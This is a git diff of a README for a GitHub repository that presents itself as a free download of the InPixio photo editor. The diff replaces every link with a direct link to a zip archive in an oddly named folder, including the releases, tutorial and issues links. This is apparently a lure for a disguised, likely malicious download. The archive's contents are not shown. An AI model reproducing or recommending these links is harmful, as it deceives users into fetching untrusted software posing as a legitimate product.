@@ -1,6 +1,6 @@
 # 🎨 InPixio-Photo-Editor-Free - Easy Photo Editing for Everyone
 
-[![Download InPixio Photo Editor](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free/releases)
+[![Download InPixio Photo Editor](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to InPixio Photo Editor Free! This software helps you edit your photos e
 To get started, you need to download the software. 
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases Page](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)
    
 2. Once on the page, look for the latest version of InPixio Photo Editor. 
 
@@ -64,10 +64,10 @@ These guides help you utilize the software’s capabilities to enhance your crea
 
 You might find interest in the following topics:
 
-- **[Batch Processing](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free)** - Save time by editing multiple images at once.
-- **[Color Correction](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free)** - Learn to adjust colors for better photos.
-- **[Photo Enhancement](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free)** - Discover tips for improving image quality.
-- **[Retouching Techniques](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free)** - Learn how to remove unwanted items from your photos.
+- **[Batch Processing](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)** - Save time by editing multiple images at once.
+- **[Color Correction](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)** - Learn to adjust colors for better photos.
+- **[Photo Enhancement](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)** - Discover tips for improving image quality.
+- **[Retouching Techniques](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)** - Learn how to remove unwanted items from your photos.
 
 ## 🤝 Community Feedback
 
@@ -75,10 +75,10 @@ Join our community to share your experiences and questions. Your feedback helps 
 
 ## 📞 Contact Us
 
-If you face any issues or have questions, feel free to reach out through the [issues section](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free/issues) on our GitHub. We aim to respond promptly to all inquiries.
+If you face any issues or have questions, feel free to reach out through the [issues section](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip) on our GitHub. We aim to respond promptly to all inquiries.
 
 ## 💡 Final Thoughts
 
-Thank you for choosing InPixio Photo Editor Free! We are excited to see the beautiful images you create. Download it today and start editing with ease. Remember, visit the [Releases Page](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free/releases) for your link to download the latest version.
+Thank you for choosing InPixio Photo Editor Free! We are excited to see the beautiful images you create. Download it today and start editing with ease. Remember, visit the [Releases Page](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip) for your link to download the latest version.
 
-[![Download InPixio Photo Editor](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SAROOTH-B/InPixio-Photo-Editor-Free/releases)
+[![Download InPixio Photo Editor](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SAROOTH-B/InPixio-Photo-Editor-Free/main/ceratiasis/Editor-Pixio-In-Photo-Free-3.6.zip)
